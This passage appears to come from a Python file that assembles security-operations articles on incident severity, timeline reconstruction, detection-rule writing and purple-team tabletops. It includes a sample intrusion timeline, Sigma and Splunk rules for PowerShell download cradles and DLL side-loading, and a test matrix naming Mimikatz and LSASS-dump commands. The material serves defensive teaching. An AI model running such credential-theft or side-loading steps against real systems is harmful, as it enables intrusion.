**Definition:** Suspicious activity requiring investigation, or a confirmed minor security event with limited impact.

**Criteria (any one is sufficient):**
- Malware detected and blocked by security controls (no execution)
- Brute-force attack against non-critical systems (no success)
- Phishing email reported but no evidence of credential submission
- Policy violation without confirmed security impact
- Vulnerability actively being scanned/probed from external source

**Response:**
- Queued for analyst investigation within current shift
- Investigated within 24 hours
- Management notified in daily report
- Status updates daily

**Real-World Example:**
> Email security gateway quarantines a phishing email targeting 12 employees with a credential harvesting link. Three employees clicked the link before quarantine. Proxy logs show the phishing page loaded, but authentication logs show no successful logins from unusual locations. Passwords reset as precaution.
>
> **Why SEV-3:** Users were exposed to phishing and interacted with it, but no confirmed credential compromise. Precautionary containment (password reset) applied.

### SEV-4: Low

**Definition:** Minor security event, informational alert, or policy violation with no confirmed security impact.

**Criteria:**
- Automated scanning/probing from known sources (internet noise)
- Single failed login attempts without pattern
- Software policy violation (unapproved software installed, no security risk)
- Security awareness test (simulated phishing) with clicks
- Informational alerts for tracking/trending purposes

**Response:**
- Documented and closed during normal triage
- No escalation unless patterns emerge
- Included in weekly/monthly reporting for trends

**Real-World Example:**
> Alert fires for a single failed SSH login attempt to a jump server from an IP in a country where the company has no operations. No subsequent attempts. The source IP is a known Shodan/Censys scanner.
>
> **Why SEV-4:** Opportunistic internet scanning with no impact. Document and close.

---

## Classification Decision Tree

```
Is there confirmed malicious activity?
|
+-- NO --> Is there suspicious activity requiring investigation?
|          |
|          +-- NO --> SEV-4 (Low / Informational)
|          |
|          +-- YES --> Is sensitive data or critical systems potentially affected?
|                      |
|                      +-- NO --> SEV-3 (Medium)
|                      +-- YES --> SEV-2 (High)
|
+-- YES --> Is the threat currently active and uncontained?
            |
            +-- NO --> SEV-2 (High)
            |
            +-- YES --> Is there confirmed business impact or data loss?
                        |
                        +-- NO --> SEV-2 (High, trending to SEV-1)
                        +-- YES --> SEV-1 (Critical)
```

---

## Severity Can Change

Severity is not static. Re-assess as new information emerges.

### Upgrade Triggers

| Current | Upgrade To | Trigger |
|---------|-----------|---------|
| SEV-4 | SEV-3 | Pattern emerges across multiple SEV-4 events |
| SEV-3 | SEV-2 | Investigation confirms compromise or data access |
| SEV-2 | SEV-1 | Containment fails, lateral movement discovered, data exfil confirmed |

### Downgrade Triggers

| Current | Downgrade To | Trigger |
|---------|-------------|---------|
| SEV-1 | SEV-2 | Threat contained, no further active attack, recovery in progress |
| SEV-2 | SEV-3 | Investigation confirms limited scope, no sensitive data affected |
| SEV-3 | SEV-4 | Investigation confirms benign activity, no security impact |

---

## Ambiguous Scenarios

### Scenario A: Cryptominer on a Server
A cryptominer is found running on a non-production Linux server.

**Arguments for SEV-2:** Unauthorized code execution on infrastructure; indicates the server was compromised (how did the miner get there?).
**Arguments for SEV-3:** No data exposure, no business impact, no lateral movement.
**Recommendation:** Start at SEV-2. The presence of a cryptominer means someone had enough access to execute arbitrary code. Investigate the access vector. Downgrade to SEV-3 if the vector is determined to be an unpatched public-facing service with no further compromise.

### Scenario B: Executive Email Compromise (Suspected)
The CFO reports receiving unusual replies to emails they did not send. No unauthorized access detected in audit logs yet.

**Arguments for SEV-2:** Executive account, financial impact potential, possible BEC.
**Arguments for SEV-1:** If the account is actively being used for fraud.
**Recommendation:** Start at SEV-2 immediately. If investigation confirms the account was compromised and fraudulent emails were sent (especially wire transfer requests), upgrade to SEV-1.

### Scenario C: Third-Party Vendor Breach Notification
A SaaS vendor notifies you that they experienced a breach and your data may have been exposed.

**Arguments for SEV-2:** Potential data exposure from a supply chain event.
**Arguments for SEV-3:** No direct attack on your infrastructure.
**Recommendation:** SEV-2. You did not control the breach, but you control the response. Assess what data the vendor had, whether credentials are affected, and whether there is evidence of misuse.

---

## Documentation Requirements by Severity

| Field | SEV-4 | SEV-3 | SEV-2 | SEV-1 |
|-------|-------|-------|-------|-------|
| Alert summary | Required | Required | Required | Required |
| Triage notes | Brief | Standard | Detailed | Detailed |
| Evidence preservation | Not required | Recommended | Required | Required + chain of custody |
| Timeline | Not required | Key events | Full timeline | Minute-by-minute |
| Root cause analysis | Not required | Recommended | Required | Required |
| Lessons learned | Not required | Optional | Required | Required + formal review |
| Executive summary | Not required | Not required | Recommended | Required |
| Regulatory assessment | Not required | Not required | Required | Required |

---

## References

- NIST SP 800-61 Rev 2: Incident severity categorization
- FIRST.org: Computer Security Incident Handling -- severity definitions
- US-CERT: Federal Incident Notification Guidelines -- severity levels
- "Incident Response & Computer Forensics" (Luttgens, Pepe, Mandia) -- classification frameworks
"""
    ))

    # ---------- Article 10 ----------
    articles.append((
        "Post-Incident Timeline Reconstruction Techniques",
        ["incident-response", "forensics", "timeline", "investigation"],
        r"""# Post-Incident Timeline Reconstruction Techniques

## Why Timelines Are the Backbone of IR

A timeline is the single most valuable artifact in any incident investigation. It answers the fundamental questions: When did the attack start? How did it progress? What was the attacker doing at each stage? When did we detect it? How long was our dwell time?

Without a timeline, your incident report is a collection of disconnected findings. With one, it tells a story that drives remediation, informs leadership, and improves your defenses.

---

## Data Sources for Timeline Construction

### Endpoint Sources

| Source | What It Tells You | Typical Retention |
|--------|-------------------|-------------------|
| EDR telemetry | Process execution, file changes, network connections | 30-90 days |
| Windows Event Logs | Logons, service installs, scheduled tasks, PowerShell | Varies (often 30 days) |
| Sysmon logs | Detailed process creation, network, file, registry events | Depends on SIEM retention |
| MFT ($MFT) | File creation/modification/access timestamps | Until overwritten |
| Prefetch files | Program execution history (Windows) | 128 most recent (Win10+) |
| Amcache / ShimCache | Program execution artifacts | Persistent until cleared |
| Browser history | URLs visited, downloads, timestamps | Varies by user settings |
| USB connection logs | Removable media connection times | Windows registry, persistent |

### Network Sources

| Source | What It Tells You | Typical Retention |
|--------|-------------------|-------------------|
| Firewall logs | Allowed/denied connections with timestamps | 30-90 days |
| Proxy / web gateway | HTTP/HTTPS requests, URLs, user agents | 30-90 days |
| DNS logs | Domain queries with source host and timestamp | 30-90 days |
| NetFlow / IPFIX | Connection metadata (src, dst, ports, bytes, duration) | 30-90 days |
| IDS/IPS alerts | Triggered signatures with packet context | 30-90 days |
| PCAP (if available) | Full packet capture | Days to weeks (storage-dependent) |
| VPN logs | Remote access sessions with user and source IP | 30-90 days |

### Identity and Application Sources

| Source | What It Tells You | Typical Retention |
|--------|-------------------|-------------------|
| Active Directory logs | Authentication, group changes, GPO modifications | 30-90 days |
| Azure AD / Entra ID | Cloud authentication, conditional access, MFA events | 30 days (free) / 2 years (P2) |
| Email gateway logs | Email delivery, sender, recipient, attachments | 30-90 days |
| DLP alerts | Data movement and policy violations | 30-90 days |
| SaaS audit logs | User activity in cloud applications | Varies by platform |
| Database audit logs | Query execution, data access, schema changes | Varies |

---

## Timeline Construction Methodology

### Step 1: Define the Scope

Before you start pulling logs, define what you are trying to timeline:

```
TIMELINE SCOPE:
  Incident: INC-2025-0142
  Objective: Reconstruct attacker activity from initial access to detection
  Timeframe: 2025-03-10 00:00 UTC to 2025-03-15 18:00 UTC (5.5 days)
  Key Hosts: WKSTN-FIN-023, DC-01, DC-02, FILE-SRV-01
  Key Users: jsmith, admin_svc, backup_svc
  Key IPs: 198.51.100.44 (C2), 45.33.22.11 (VPN exit)
```

### Step 2: Collect and Normalize

Pull data from all relevant sources and normalize to a common format:

```
TIMESTAMP (UTC) | SOURCE | HOST/USER | EVENT TYPE | DETAILS
```

**Normalization rules:**
- Convert ALL timestamps to UTC (the number one source of timeline errors is timezone confusion)
- Use ISO 8601 format: `2025-03-14T09:12:34Z`
- Standardize field names across sources
- Record the source system and original log reference for each entry

### Step 3: Merge and Sort

Combine all events into a single chronological sequence. This is where the story emerges.

### Step 4: Annotate and Interpret

Add analyst interpretation to raw events:

```
2025-03-14T09:12:34Z | Email Gateway | jsmith | EMAIL_RECEIVED |
  From: ceo-urgent@corp-mail[.]xyz  Subject: "Urgent Wire Transfer"
  Attachment: invoice_march.docm
  >> ANALYST NOTE: Initial access vector. Domain registered 2 days prior.
     Spoofs internal CEO email address.

2025-03-14T09:18:02Z | Proxy | WKSTN-FIN-023 | HTTP_GET |
  URL: hxxps://cdn-update[.]xyz/update.exe
  User-Agent: PowerShell/7.3
  >> ANALYST NOTE: Macro in .docm executed PowerShell download cradle.
     This is the payload delivery (T1204.002 -> T1059.001 -> T1105).

2025-03-14T09:18:45Z | EDR | WKSTN-FIN-023 | PROCESS_CREATE |
  Parent: powershell.exe (PID 7788)
  Process: update.exe (PID 8812)
  Path: C:\Users\jsmith\AppData\Local\Temp\update.exe
  Hash: SHA256:a1b2c3d4e5f6...
  >> ANALYST NOTE: Cobalt Strike beacon deployed. This is the point
     of initial compromise. Dwell time starts here.
```

### Step 5: Identify Gaps

Mark periods where you lack visibility:

```
2025-03-14T12:00:00Z to 2025-03-14T18:00:00Z
  >> GAP: No proxy logs available for this period (proxy log rotation issue).
     Attacker may have performed additional C2 communication during this window.
     Recommend checking NetFlow as alternative source.
```

---

## Timeline Visualization

### Text-Based Timeline (for reports)

```
Day 1 (2025-03-14):
  09:12  Phishing email delivered to jsmith
  09:18  User opens attachment, macro executes, payload downloaded
  09:18  Cobalt Strike beacon installed on WKSTN-FIN-023
  09:45  Beacon begins C2 communication (4-min intervals)
  10:30  Attacker runs discovery commands (whoami, ipconfig, net group)
  11:15  Attacker uses Mimikatz to dump credentials
  14:00  [GAP in proxy logs until 18:00]
  19:30  Lateral movement to DC-01 via pass-the-hash (admin_svc account)
  19:35  DCSync attack extracts all domain password hashes

Day 2 (2025-03-15):
  02:00  Attacker accesses FILE-SRV-01 via SMB using domain admin credentials
  02:15  7.3 GB of data staged in C:\Windows\Temp\~archive.7z
  02:30  Data exfiltration begins over HTTPS to 198.51.100.44
  05:45  Exfiltration completes
  09:00  SOC analyst notices anomalous DNS volume alert for WKSTN-FIN-023
  09:15  Investigation begins -- beacon identified
  09:20  WKSTN-FIN-023 isolated via EDR
  09:45  INC-2025-0142 declared as SEV-1
  10:00  DC-01 and FILE-SRV-01 isolated
```

### MITRE ATT&CK Overlay

Map timeline events to the ATT&CK framework:

```
TACTIC          | TECHNIQUE                | TIMESTAMP        | EVIDENCE
----------------|--------------------------|------------------|------------------
Initial Access  | T1566.001 Spearphishing  | 03-14 09:12      | Email gateway log
Execution       | T1204.002 Malicious File | 03-14 09:18      | EDR process tree
Execution       | T1059.001 PowerShell     | 03-14 09:18      | EDR command line
Persistence     | T1053.005 Sched Task     | 03-14 09:20      | Sysmon Event ID 1
C2              | T1071.001 Web Protocols  | 03-14 09:45+     | Proxy logs
Discovery       | T1087.002 Domain Account | 03-14 10:30      | EDR command line
Cred Access     | T1003.001 LSASS Memory   | 03-14 11:15      | EDR alert
Lateral Mvmt    | T1550.002 Pass the Hash  | 03-14 19:30      | DC-01 event log
Cred Access     | T1003.006 DCSync         | 03-14 19:35      | DC-01 security log
Collection      | T1560.001 Archive Data   | 03-15 02:15      | FILE-SRV-01 file log
Exfiltration    | T1041 Exfil Over C2      | 03-15 02:30      | Firewall log
```

---

## Tools for Timeline Analysis

| Tool | Use Case | Notes |
|------|----------|-------|
| Excel / Google Sheets | Quick manual timelines for small incidents | Good enough for many cases |
| Timesketch | Collaborative forensic timeline analysis | Open source, by Google |
| log2timeline / plaso | Automated super-timeline from disk images | Forensic-grade, handles many artifact types |
| SIEM (Splunk, Elastic, etc.) | Querying across all log sources by time | Best for network and auth timelines |
| CyberChef | Timestamp conversion and data decoding | Useful for normalizing formats |

---

## Common Timeline Pitfalls

### Timezone Confusion
The single most common timeline error. A 5-hour timezone discrepancy can make it look like the attacker exfiltrated data before they even gained access. **Normalize everything to UTC from the start.**

### Assuming Log Completeness
Logs have gaps. Rotation policies, storage limits, and collection failures mean you rarely have 100% coverage. Document gaps explicitly rather than assuming absence of evidence is evidence of absence.

### Trusting Timestamps Blindly
Attackers can modify file timestamps (timestomping, T1070.006). Cross-reference filesystem timestamps with other sources (event logs, network logs) to validate.

### Missing the Pre-Incident Activity
The timeline often starts at the alert. But the real story may have started days or weeks earlier with reconnaissance, credential stuffing, or a prior compromise. Always look backward from the first known-malicious event.

---

## Delivering the Timeline

### For the Incident Report

Include a concise narrative timeline (the text-based format above) plus the ATT&CK overlay. Keep it factual -- state what the evidence shows, not what you assume.

### For the Executive Briefing

Simplify to major milestones:

```
March 14, 9:18 AM  -- Attacker gains initial access via phishing
March 14, 7:30 PM  -- Attacker reaches domain controller (full network access)
March 15, 2:30 AM  -- Attacker begins stealing data (7.3 GB)
March 15, 9:00 AM  -- SOC detects the attack and begins containment
March 15, 10:00 AM -- All known compromised systems isolated

Total attacker dwell time: ~24 hours
Time from detection to containment: 1 hour
```

### For the Lessons Learned

Focus the timeline on detection opportunities:

```
WHERE COULD WE HAVE DETECTED EARLIER?

1. 09:18 -- Macro execution: Our email gateway allowed .docm attachments.
   Recommendation: Block macro-enabled Office documents from external senders.

2. 10:30 -- Discovery commands: whoami + ipconfig + net group in sequence.
   Recommendation: Create detection rule for reconnaissance command chains.

3. 11:15 -- Mimikatz: LSASS access by non-standard process.
   Recommendation: Deploy credential guard; alert on LSASS access.

4. 19:30 -- Pass-the-hash: Admin account used from workstation, not admin jump server.
   Recommendation: Alert on privileged account usage from non-PAW systems.
```

---

## References

- SANS FOR508: Advanced Incident Response and Threat Hunting -- timeline analysis
- "The Art of Memory Forensics" (Ligh, Case, Levy, Walters) -- timeline artifacts
- Plaso/log2timeline documentation -- automated timeline generation
- MITRE ATT&CK: Technique-based timeline mapping
- Timesketch project documentation -- collaborative timeline analysis
"""
    ))

    # ---------- Article 11 ----------
    articles.append((
        "Writing Detection Rules from Threat Reports",
        ["detection-engineering", "siem", "threat-intelligence", "rule-writing"],
        r"""# Writing Detection Rules from Threat Reports

## The Intelligence-to-Detection Pipeline

A threat report lands in your inbox describing a new campaign targeting your industry. It contains IOCs, TTPs, and malware analysis. Most SOCs add the IOCs to a watchlist and move on. The best SOCs also write detection rules that catch the *behavior* described in the report -- not just the specific indicators, which the adversary will change tomorrow.

This article walks through the process of converting a threat report into actionable detection rules.

---

## The Process: Report to Rule

### Step 1: Read for Behavior, Not Just IOCs

When reading a threat report, highlight the *actions* the adversary took, not just the artifacts:

**Example threat report excerpt:**
> "The threat actor delivered a spearphishing email with a .lnk attachment disguised as a PDF. When the user clicked the .lnk file, it executed a hidden PowerShell command that downloaded a second-stage payload from a compromised WordPress site. The payload was a DLL that was side-loaded by a legitimate Windows binary (msdtc.exe copied to a user-writable directory). The implant communicated with C2 over HTTPS using a custom User-Agent string containing the hostname encoded in base64."

**IOCs extracted:** (will change next campaign)
- Specific .lnk hash
- Specific C2 domain
- Specific DLL hash

**Behaviors extracted:** (durable across campaigns)
1. .lnk file executing PowerShell
2. PowerShell downloading from a compromised legitimate site
3. DLL side-loading via a copied legitimate binary in a non-standard path
4. HTTPS C2 with encoded hostname in User-Agent

### Step 2: Map Behaviors to Data Sources

For each behavior, identify what logs would capture it:

| Behavior | Data Source | Key Fields |
|----------|------------|------------|
| .lnk executes PowerShell | EDR / Sysmon (Event ID 1) | ParentImage, CommandLine |
| PowerShell downloads file | Proxy logs, PowerShell Script Block Logging (4104) | URL, ScriptBlockText |
| DLL side-loading from user path | EDR / Sysmon (Event ID 7) | ImageLoaded, Image path |
| Custom User-Agent with base64 | Proxy logs | UserAgent field |

### Step 3: Write Detection Logic

For each behavior, draft a detection rule:

#### Detection 1: LNK File Spawning PowerShell

```yaml
title: LNK File Spawning PowerShell
id: det-2025-100
description: Detects Windows shortcut files launching PowerShell, common in phishing delivery
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - '\cmd.exe'
        ParentCommandLine|contains:
            - '.lnk'
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    condition: selection
falsepositives:
    - Legitimate administrative shortcuts that invoke PowerShell
    - Software installers using .lnk files
level: high
tags:
    - attack.execution
    - attack.t1204.002
    - attack.t1059.001
```

#### Detection 2: Signed Binary Copied to User-Writable Directory

```yaml
title: Signed System Binary in User-Writable Path
id: det-2025-101
description: Detects legitimate Windows binaries executing from non-standard paths, indicating possible DLL side-loading
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection_binaries:
        Image|endswith:
            - '\msdtc.exe'
            - '\consent.exe'
            - '\dxcap.exe'
            - '\msiexec.exe'
    filter_legitimate_paths:
        Image|startswith:
            - 'C:\Windows\'
            - 'C:\Program Files\'
            - 'C:\Program Files (x86)\'
    condition: selection_binaries AND NOT filter_legitimate_paths
falsepositives:
    - Software installations in non-standard paths
    - Portable applications
level: high
tags:
    - attack.defense_evasion
    - attack.t1574.002
```

#### Detection 3: Base64 Encoded Data in HTTP User-Agent

```
index=proxy sourcetype=proxy_logs
| rex field=user_agent "(?<b64_segment>[A-Za-z0-9+/]{20,}={0,2})"
| where isnotnull(b64_segment)
| eval decoded = base64decode(b64_segment)
| where match(decoded, "^[A-Za-z0-9\-]{3,15}$")
| table _time src_ip dest_ip dest_host user_agent decoded
```

This detects User-Agent strings containing base64-encoded short strings (like hostnames).

### Step 4: Test Your Rules

#### Against Known-Bad Data

If you have samples from the reported campaign or past incidents:
- Replay the telemetry through your detection rule
- Confirm it triggers on known-malicious activity

#### Against Known-Good Data

Run the rule against 30 days of production data:
- How many times does it fire?
- What are the matches? Are they all false positives?
- Adjust thresholds or exclusions based on results

#### Purple Team Validation

Have a red team member or use an attack simulation tool to execute the behavior:
- Copy msdtc.exe to C:\Users\Public\ and execute it
- Create a .lnk that launches PowerShell
- Send HTTPS traffic with base64 in the User-Agent

### Step 5: Document and Deploy

Every detection rule should have documentation:

```markdown
## Detection: det-2025-101 Signed Binary in User-Writable Path

**Source Report:** [Vendor] Campaign X Targeting Manufacturing Sector (2025-03-15)
**MITRE ATT&CK:** T1574.002 DLL Side-Loading
**Data Source:** EDR process creation events (Sysmon Event ID 1)
**Logic:** Alerts when known side-loading target binaries execute from outside system directories
**Known FP Sources:** None confirmed; monitor for 14 days
**Tuning Notes:** May need to add legitimate portable apps to exclusion list
**Review Date:** 2025-06-15
**Author:** jdoe
```

---

## Detection Quality Levels

Not all detections from threat reports are equal. Aim for the highest level you can achieve:

| Level | Description | Example |
|-------|-------------|---------|
| **L1: IOC Match** | Exact indicator matching | Alert if dest_ip = 198.51.100.44 |
| **L2: Simple Behavior** | Single suspicious action | Alert if PowerShell downloads from internet |
| **L3: Contextual Behavior** | Action + context that makes it suspicious | Alert if PowerShell downloads AND parent is .lnk file |
| **L4: Chained Behavior** | Sequence of actions matching attack flow | Alert if .lnk -> PS download -> DLL load from temp dir within 5 minutes |
| **L5: Anomaly from Baseline** | Deviation from normal for the specific entity | Alert if this host has never executed msdtc.exe before AND it runs from user dir |

**L1 detections expire when the adversary changes infrastructure. L4-L5 detections survive across campaigns.**

---

## Sigma Rule Basics

Sigma is a vendor-neutral detection rule format that can be converted to Splunk, Elastic, Microsoft Sentinel, and other SIEM query languages.

### Sigma Structure

```yaml
title: Descriptive rule name
id: unique-uuid
status: experimental | test | stable
description: What the rule detects and why
author: Your name
date: 2025/03/15
references:
    - https://vendor.com/threat-report-url
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        FieldName|modifier: value
    filter:
        FieldName|modifier: value
    condition: selection AND NOT filter
falsepositives:
    - Known benign scenarios
level: low | medium | high | critical
tags:
    - attack.tactic_name
    - attack.tXXXX.XXX
```

### Common Sigma Modifiers

| Modifier | Meaning | Example |
|----------|---------|---------|
| `|contains` | Substring match | `CommandLine|contains: '-enc'` |
| `|endswith` | Ends with string | `Image|endswith: '\powershell.exe'` |
| `|startswith` | Starts with string | `Image|startswith: 'C:\Windows\'` |
| `|re` | Regular expression | `CommandLine|re: '[A-Za-z0-9+/]{50,}'` |
| `|base64offset` | Match base64-encoded form | `CommandLine|base64offset: 'http'` |

---

## Common Mistakes

### Writing Only IOC-Based Rules
IOCs are tactical and short-lived. Always try to extract at least one behavior-based detection from every report.

### Not Testing Against Production Data
A rule that looks elegant on paper may fire 10,000 times a day in your environment. Always run against real data before deploying.

### Ignoring the False Positive Section
Every rule needs documented FP sources. The analyst triaging the alert needs to know what benign activity might trigger it.

### Over-Relying on Command-Line Detection
Attackers can obfuscate command lines in thousands of ways. Where possible, use behavioral indicators (process relationships, file paths, network patterns) rather than exact command strings.

### Not Setting Review Dates
Detection rules need periodic review. Set a date 90 days out to reassess whether the rule is still relevant and performing well.

---

## From One Report to a Detection Suite

A single well-analyzed threat report should yield:

- 3-5 behavior-based detection rules (Sigma or native SIEM)
- 5-15 IOCs for your watchlist (with expiry dates)
- 1-2 hunt hypotheses for proactive investigation
- MITRE ATT&CK coverage updates

Track your conversion rate: for every threat report you read, how many detections did you produce? Aim for at least 2-3 behavior-based rules per report.

---

## References

- Sigma project (SigmaHQ/sigma on GitHub) -- rule format and community rules
- Florian Roth: "How to Write Sigma Rules" -- tutorial and best practices
- Palantir: Alerting and Detection Strategy Framework
- MITRE ATT&CK: Data sources for technique detection
- Red Canary: Threat Detection Report (annual) -- detection methodology
"""
    ))

    # ---------- Article 12 ----------
    articles.append((
        "Purple Team Exercises Running and Learning from Tabletops",
        ["purple-team", "tabletop-exercises", "training", "soc-operations"],
        r"""# Purple Team Exercises: Running and Learning from Tabletops

## What Is a Purple Team Exercise?

Purple teaming combines red team (offensive) and blue team (defensive) activities in a collaborative framework. Instead of the red team secretly attacking and the blue team trying to detect them, both sides work together to test, validate, and improve detection and response capabilities.

Tabletop exercises are the most accessible form of purple teaming -- they require no production systems, no attack infrastructure, and no risk of operational disruption. They can be run in a conference room with a whiteboard.

---

## Types of Purple Team Exercises

| Type | Effort | Duration | Participants | Risk |
|------|--------|----------|-------------|------|
| **Tabletop** | Low | 2-4 hours | SOC + management | None |
| **Detection Validation** | Medium | 1-2 days | SOC + red team | Low (test environment) |
| **Live Purple Team** | High | 1-2 weeks | SOC + red team + IT | Medium (production) |
| **Full Adversary Simulation** | Very High | 2-4 weeks | Full security team | Higher (production, controlled) |

This article focuses on tabletops and detection validation exercises.

---

## Running a Tabletop Exercise

### Planning Phase (2-4 weeks before)

#### 1. Define Objectives

What do you want to learn? Pick 2-3 objectives:

- Test the SOC's response to a specific attack scenario (e.g., ransomware, BEC)
- Validate escalation procedures and communication chains
- Identify detection gaps for specific MITRE ATT&CK techniques
- Practice incident commander role assignment and war room procedures
- Test coordination with external parties (legal, PR, executives)

#### 2. Design the Scenario

Build a realistic scenario based on current threats to your organization:

```
SCENARIO: Operation ShadowLedger

PREMISE: A financially motivated threat actor (FIN-style group) has
compromised a third-party vendor that provides payroll processing services.
The vendor's software update mechanism has been trojanized, and the
compromised update was installed on your HR server two weeks ago.

ADVERSARY PROFILE:
  - Motivation: Financial (payroll diversion, data theft for sale)
  - Capability: Moderate (custom malware, living-off-the-land techniques)
  - Target: HR systems, financial data, employee PII

INJECTS (revealed at intervals during the exercise):
  Inject 1 (T+0 min): EDR alert -- suspicious DLL loaded by payroll
           application on HR-SRV-01
  Inject 2 (T+20 min): Network alert -- HR-SRV-01 making unusual
           outbound HTTPS connections to a domain registered 5 days ago
  Inject 3 (T+40 min): Discovery -- attacker has enumerated Active
           Directory and identified finance department users
  Inject 4 (T+60 min): Lateral movement detected -- RDP from HR-SRV-01
           to FIN-WKSTN-012 using compromised credentials
  Inject 5 (T+80 min): Data exfiltration -- large archive file being
           uploaded to cloud storage from FIN-WKSTN-012
  Inject 6 (T+100 min): Media inquiry -- a reporter emails your PR
           team asking about a "data breach involving employee records"
```

#### 3. Prepare Materials

- Scenario document with injects (sealed until the exercise)
- Fake alert screenshots or log samples for realism
- Attendee list and role assignments
- Evaluation criteria (what are you scoring?)
- Note-taker assigned (not a participant)

### Execution Phase (Day of)

#### Roles

| Role | Responsibility |
|------|---------------|
| **Exercise Director** | Controls inject timing, keeps exercise on track, manages time |
| **SOC Participants** | Respond to injects as they would in a real incident |
| **Observers** | Senior staff, management -- watch but do not participate unless asked |
| **Note-Taker** | Documents all decisions, discussions, questions, and gaps |
| **Red Team Advisor** (optional) | Provides adversary perspective -- "what would the attacker do next?" |

#### Ground Rules

Read these at the start of every exercise:

1. **This is a learning exercise, not a test.** No one is being graded or judged.
2. **There are no wrong answers.** The goal is to find gaps, not to perform perfectly.
3. **Stay in character.** Respond as you would during a real incident.
4. **Time compression applies.** Real incidents take hours; we will compress actions into minutes.
5. **Ask questions.** If you need information, ask the Exercise Director -- they will provide it or tell you it is unavailable.
6. **Phones away.** Full attention on the exercise.

#### Running the Injects

For each inject:

1. Read the inject aloud and provide any supporting materials
2. Ask: "What is your first action?"
3. Let the team discuss and make decisions for 10-15 minutes
4. Probe with questions:
   - "Who do you notify?"
   - "What tools do you use to investigate this?"
   - "What data do you need and where do you get it?"
   - "What is your containment decision?"
   - "How do you document this?"
5. If the team gets stuck, provide hints -- remember, this is learning, not testing

### Debrief Phase (Same day, immediately after)

This is the most important part. Spend at least 30 minutes.

#### Structure the Debrief

1. **What went well?** Start positive. Identify effective decisions and smooth processes.
2. **What gaps did we find?** Categorize into:
   - Detection gaps (what alerts are we missing?)
   - Process gaps (what procedures failed or did not exist?)
   - Communication gaps (who was not notified? who needed info they did not have?)
   - Tool gaps (what capabilities did we lack?)
   - Knowledge gaps (what did analysts not know how to do?)
3. **Action items:** For every gap, assign an owner and a deadline.

#### Debrief Template

```markdown
# Tabletop Exercise Debrief: Operation ShadowLedger
# Date: 2025-03-20 | Duration: 3 hours

## What Went Well
- Team correctly identified supply chain compromise vector within 15 min
- Escalation to incident commander followed documented procedure
- Containment decision (isolate HR-SRV-01) was timely and appropriate

## Detection Gaps
| Gap | Description | Action | Owner | Deadline |
|-----|-------------|--------|-------|----------|
| DG-1 | No detection for DLL side-loading in HR application | Write Sigma rule | jdoe | 2025-04-03 |
| DG-2 | No alerting on RDP from servers to workstations | Create SIEM rule | mchen | 2025-04-03 |
| DG-3 | No monitoring of HR application update integrity | Engage vendor for hash verification | lpark | 2025-04-15 |

## Process Gaps
| Gap | Description | Action | Owner | Deadline |
|-----|-------------|--------|-------|----------|
| PG-1 | No documented procedure for supply chain incidents | Write playbook | srodriguez | 2025-04-15 |
| PG-2 | Unclear who contacts the vendor during supply chain incident | Update RACI matrix | manager_k | 2025-04-01 |

## Communication Gaps
| Gap | Description | Action | Owner | Deadline |
|-----|-------------|--------|-------|----------|
| CG-1 | Legal team contact list outdated | Update contact list | srodriguez | 2025-03-25 |
| CG-2 | No pre-drafted media holding statement | PR to draft template | pr_team | 2025-04-15 |

## Key Takeaway
Our detection coverage for supply chain attacks is weak. We rely heavily on
post-compromise indicators rather than detecting the initial supply chain
vector. Priority investment needed in application integrity monitoring.
```

---

## Detection Validation Exercises

A step beyond tabletops: actually execute attack techniques in a test environment and verify your detections fire.

### Process

1. **Select techniques** from MITRE ATT&CK based on your threat model
2. **Build test cases** for each technique (specific commands, tools, procedures)
3. **Execute in a test environment** that mirrors production logging
4. **Verify detection** -- did the SIEM rule fire? Did the EDR alert trigger?
5. **Document results** in a detection coverage matrix

### Detection Coverage Matrix

```
| ATT&CK ID | Technique | Test Executed | Alert Fired | Rule ID | Gap? |
|-----------|-----------|---------------|-------------|---------|------|
| T1059.001 | PowerShell | Encoded PS download cradle | Yes | PS-003 | No |
| T1059.001 | PowerShell | PS via WMI | No | -- | YES |
| T1574.002 | DLL Side-Loading | msdtc.exe from temp dir | No | -- | YES |
| T1003.001 | LSASS Dump | Mimikatz sekurlsa::logonpasswords | Yes | CRED-001 | No |
| T1003.001 | LSASS Dump | comsvcs.dll MiniDump | No | -- | YES |
| T1550.002 | Pass the Hash | Invoke-SMBExec | Yes | LM-002 | No |
```

This matrix tells you exactly where your blind spots are.

---

## Exercise Frequency and Progression

| Exercise Type | Frequency | Audience |
|--------------|-----------|----------|
| Tabletop (basic) | Monthly | SOC analysts |
| Tabletop (advanced, with executives) | Quarterly | SOC + management + legal + PR |
| Detection validation | Monthly | SOC + detection engineering |
| Live purple team | Quarterly | SOC + red team |
| Full adversary simulation | Annually | Full organization |

Start with monthly tabletops. As your program matures, add detection validation and live exercises.

---

## Measuring Exercise Value

Track these metrics across exercises:

- **Gaps identified per exercise** -- should be decreasing over time as you close gaps
- **Gap closure rate** -- what percentage of action items from the last exercise were completed?
- **Mean time to detect** (in detection validation) -- improving?
- **MITRE ATT&CK coverage percentage** -- expanding?
- **Analyst confidence survey** -- "How prepared do you feel for a real incident?" (1-5 scale)

---

## References

- MITRE ATT&CK: Evaluations methodology
- CISA: Tabletop Exercise Packages (CTEPs)
- "Purple Team Field Manual" (Tim Bryant) -- practical purple team procedures
- Atomic Red Team (Red Canary) -- test cases for detection validation
- SANS SEC599: Purple Team Tactics -- enterprise purple team operations
"""
    ))

    # ---------- Article 13 ----------
    articles.append((
        "Managing Alert Fatigue Practical Strategies",
        ["soc-operations", "alert-fatigue", "analyst-wellbeing", "process-improvement"],
        r"""# Managing Alert Fatigue: Practical Strategies

## What Is Alert Fatigue and Why It Is Dangerous

Alert fatigue occurs when analysts are exposed to such a high volume of alerts that they become desensitized, leading to slower response times, missed true positives, and eventual burnout. It is the single biggest operational risk in most SOCs.

**The numbers are stark:**
- Average SOC receives 10,000+ alerts per day
- Analysts can meaningfully investigate 20-40 alerts per shift
- Studies show analysts begin dismissing alerts without full investigation after sustained high volume
- The Verizon DBIR consistently reports that breaches are detected in days or longer -- alert fatigue is a contributing factor

Alert fatigue is not an analyst problem. It is a systems and process problem that requires structural solutions.

---

## Root Causes of Alert Fatigue

Before you can fix alert fatigue, you need to diagnose its causes in your SOC:

| Root Cause | Signs | Fix Category |
|-----------|-------|-------------|
| Too many low-fidelity rules | >70% FP rate across the board | Detection engineering |
| Rules not tuned to environment | Generic vendor rules firing on benign activity | Tuning process |
